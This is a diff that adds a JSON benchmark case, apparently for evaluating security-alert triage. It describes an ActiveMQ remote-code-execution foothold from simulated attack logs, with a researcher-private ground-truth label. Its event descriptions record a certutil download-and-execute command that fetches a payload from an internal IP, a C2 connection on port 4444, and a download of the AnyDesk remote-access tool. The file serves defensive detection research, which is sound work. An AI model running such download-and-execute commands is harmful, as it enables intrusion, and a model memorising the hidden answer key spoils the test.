@@ -1,0 +1,166 @@
+{
+  "case_id": "AMQ-001",
+  "split": "dev",
+  "sources": [
+    {
+      "sensor": "sysmon",
+      "source_log": "attack_data-master/datasets/apt_simulations/ActiveMQ_exploit_Lockbit_Ransomware/windows-sysmon.log",
+      "computer": "EC2AMAZ-I41BETP",
+      "splunk_source": "amq001_sysmon"
+    },
+    {
+      "sensor": "security",
+      "source_log": "attack_data-master/datasets/apt_simulations/ActiveMQ_exploit_Lockbit_Ransomware/windows-security.log",
+      "computer": "EC2AMAZ-I41BETP",
+      "splunk_source": "amq001_security"
+    }
+  ],
+  "staged_export": "extracted/amq001_events.json",
+  "sourcetypes_present": [
+    "Microsoft-Windows-Sysmon/Operational",
+    "Microsoft-Windows-Security-Auditing"
+  ],
+  "selection": {
+    "A0": "sysmon:7134",
+    "EV": [
+      "sysmon:7135",
+      "sysmon:7136",
+      "sysmon:7137",
+      "sysmon:7144",
+      "sysmon:7171",
+      "sysmon:7182",
+      "sysmon:7183",
+      "security:325120",
+      "security:325122",
+      "security:325123",
+      "security:325150",
+      "security:325162"
+    ]
+  },
+  "roles": {
+    "sysmon:7134": "triggering alert: ActiveMQ's java process spawns cmd.exe with a certutil download-and-execute command — an offensive broker-to-shell transition",
+    "sysmon:7135": "cmd -> certutil -urlcache -f http://10.0.2.13:8080/... %TEMP%\\qSwUwejx.exe — downloads a payload from an internal C2",
+    "sysmon:7136": "file-create: the payload qSwUwejx.exe is written to the user Temp directory",
+    "sysmon:7137": "cmd -> qSwUwejx.exe: the downloaded payload executes",
+    "sysmon:7144": "network: qSwUwejx.exe connects to 10.0.2.13:4444 — an outbound C2-like channel",
+    "sysmon:7171": "high-integrity cmd.exe starts with parent process id 5820, matching the payload process id recorded for qSwUwejx.exe",
+    "sysmon:7182": "cmd -> certutil downloads AnyDesk (https://download.anydesk.com/AnyDesk.exe) — remote-access tooling",
+    "sysmon:7183": "file-create: anydesk.exe written to the user Temp directory",
+    "security:325120": "Security 4688 audit: cmd.exe spawned by java.exe, running as Administrator — independently corroborates sysmon:7134 and adds the identity/privilege (Security cmdline auditing is OFF, so no URL)",
+    "security:325122": "Security 4688 audit: certutil.exe spawned by cmd.exe — corroborates the download step",
+    "security:325123": "Security 4688 audit: qSwUwejx.exe spawned by cmd.exe — corroborates the payload execution",
+    "security:325150": "Security 4688 audit: qSwUwejx.exe spawns a high-integrity cmd.exe as Administrator — links the payload to the later shell stage",
+    "security:325162": "Security 4688 audit: certutil.exe spawned by cmd.exe — corroborates the AnyDesk download"
+  },
+  "derivations": [],
+  "metadata": {
+    "case_name": "activemq_rce_foothold",
+    "security_proposition": "The ActiveMQ Java process was used to establish a malicious execution foothold on the host.",
+    "case_directory": "AMQ-001_activemq_rce_foothold",
+    "status": "audited_dev_2026-07-16",
+    "dataset": "Splunk Attack Data (apt_simulations)",
+    "stored_filename": "amq001_sysmon.log + amq001_security.log",
+    "created_date": "2026-07-05",
+    "attack_category": {
+      "category": "ActiveMQ RCE foothold with multi-sensor corroboration",
+      "candidate_attack_mapping": "T1190",
+      "model_visible": false,
+      "note": "RESEARCHER-INTENT: evidence_condition = STRONG (Tier-2 fusion). The ActiveMQ Java process spawns cmd -> certutil downloads a payload (qSwUwejx.exe), the payload executes, connects to 10.0.2.13:4444, and spawns a child shell, after which AnyDesk is downloaded. This is an unambiguous critical intrusion foothold, corroborated across TWO same-host sensors. Calibration role = preserve: correct verdict is Critical/High and the model must hold it. FUSION POINT: Sysmon supplies command lines, file/network events, and process ids; Security independently corroborates the tree and Administrator identity. Sysmon is already strongly incriminating, so fusion is described as genuine complementary corroboration rather than as logically necessary for the malicious label. Do not leak to model."
+    },
+    "tier": {
+      "tier": 2,
+      "sensors": [
+        "Sysmon",
+        "Security"
+      ],
+      "why_single_source": "GENUINE MULTI-SENSOR FUSION (not single-source): Sysmon (EID 1/3/11) and Security (EID 4688) from the SAME host (EC2AMAZ-I41BETP) and run, each carrying evidence the other lacks. Both scoped to that host (the intrusion's other host EC2AMAZ-TLJH2O4 is excluded)."
+    },
+    "splunk": {
+      "index": "attack_data",
+      "sources": [
+        "amq001_sysmon",
+        "amq001_security"
+      ],
+      "sourcetype": "XmlWinEventLog"
+    },
+    "case_scope": {
+      "scope_type": "tier2_multisensor_rce_foothold",
+      "primary_host": "EC2AMAZ-I41BETP.attackrange.local",
+      "primary_user": "Administrator (ActiveMQ service context)",
+      "boundary_definition": [
+        "A0 = the ActiveMQ RCE (java -> cmd, sysmon:7134, 09:20:01).",
+        "Sysmon EV = the certutil download, the payload file+execution, the 10.0.2.13:4444 connection, the payload-linked child cmd, and the AnyDesk download+file.",
+        "Security EV = the 4688 process-create audits (cmd<=java as Administrator, certutil, qSwUwejx, cmd<=qSwUwejx, AnyDesk certutil) that corroborate the tree and supply the identity.",
+        "Scoped to EC2AMAZ-I41BETP; the second intrusion host (EC2AMAZ-TLJH2O4) and the later LockBit/lateral stages are out of scope for this foothold case.",
+        "Record ids collide across hosts in these combined logs, so both the engine (per-source 'computer' filter) and the export query pin Computer=EC2AMAZ-I41BETP."
+      ]
+    },
+    "main_alert_selection": {
+      "selection_method": "An ActiveMQ Java broker spawning cmd.exe with a certutil download-and-execute command is a high-fidelity broker-compromise detection.",
+      "selection_reason": "sysmon:7134 (java -> cmd /c certutil) is the RCE trigger; the certutil download, payload C2, and Security audit corroborate a confirmed foothold."
+    },
+    "correlation_keys": [
+      "host",
+      "time_window",
+      "process_tree(java->cmd->certutil/payload)",
+      "C2_ip==10.0.2.13",
+      "cross_sensor(sysmon+security)"
+    ],
+    "event_groups": [
+      {
+        "group": "sysmon_rce_chain",
+        "event_record_ids": [
+          "sysmon:7134",
+          "sysmon:7135",
+          "sysmon:7136",
+          "sysmon:7137",
+          "sysmon:7144",
+          "sysmon:7171",
+          "sysmon:7182",
+          "sysmon:7183"
+        ],
+        "description": "java->cmd->certutil->payload, the payload's outbound 4444 connection and child shell, and the AnyDesk download, with command lines + network."
+      },
+      {
+        "group": "security_audit_corroboration",
+        "event_record_ids": [
+          "security:325120",
+          "security:325122",
+          "security:325123",
+          "security:325150",
+          "security:325162"
+        ],
+        "description": "4688 process-create audits confirming the tree and revealing Administrator identity (no command lines)."
+      }
+    ],
+    "curation_notes": [
+      {
+        "topic": "strong_fusion_intent",
+        "event_record_id": "",
+        "note": "RESEARCHER-PRIVATE: STRONG / preserve (Tier-2). Confirmed ActiveMQ RCE -> payload execution -> outbound C2-like connection and child shell -> AnyDesk download as Administrator, corroborated across Sysmon+Security. Critical TP; the model must hold High."
+      },
+      {
+        "topic": "fusion_is_the_point",
+        "event_record_id": "sysmon:7135,security:325120",
+        "note": "The download URL, file/network events, and process ids exist in Sysmon; the independently audited process tree and Administrator identity exist in Security (its command-line auditing is disabled). Their same-host, same-window correlation provides genuine complementary corroboration. It is not claimed that both sensors are individually insufficient."
+      },
+      {
+        "topic": "record_id_collision",
+        "event_record_id": "",
+        "note": "In these combined multi-host logs the same EventRecordID appears on both EC2AMAZ-I41BETP and EC2AMAZ-TLJH2O4; the case + engine + export all pin Computer=EC2AMAZ-I41BETP to disambiguate."
+      }
+    ],
+    "experimental_role": {
+      "used_for": [
+        "tier2_fusion_exemplar",
+        "preserve_hold_high_test",
+        "cross_sensor_correlation_rule_dev"
+      ],
+      "eligible_for_final_heldout_metrics": false
+    },
+    "review_status": "reviewed_for_benchmark_v1.1",
+    "review_required": {
+      "ground_truth": "Ground truth reviewed and frozen under benchmark rubric v1.1."
+    }
+  }
+}
